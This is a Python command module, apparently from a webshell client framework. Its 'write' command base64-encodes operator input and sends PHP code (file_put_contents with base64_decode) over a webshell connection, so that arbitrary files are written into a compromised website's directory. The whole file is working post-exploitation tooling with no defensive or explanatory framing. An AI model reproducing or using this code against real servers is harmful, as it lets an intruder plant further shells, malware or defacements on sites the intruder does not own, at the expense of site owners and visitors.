from re import match

from libs.config import alias, color
from libs.app import multi_input
from libs.myapp import send, base64_encode


@alias(True, func_alias="w")
def run(web_file_path: str):
    """
    write

    Write files directly to the website directory
    """
    result = base64_encode(multi_input(" >>>"))
    text = send(f"print(file_put_contents('{web_file_path}', base64_decode('{result}')));").r_text.strip()
    if (match(r"\w+", text) and text != '0'):
        print(color.green(f"\nWrite {web_file_path} success.\n"))
    else:
        print(color.red(f"\nWrite {web_file_path} failed.") + color.yellow("\n\nResponse:") + f"\n{text}\n")
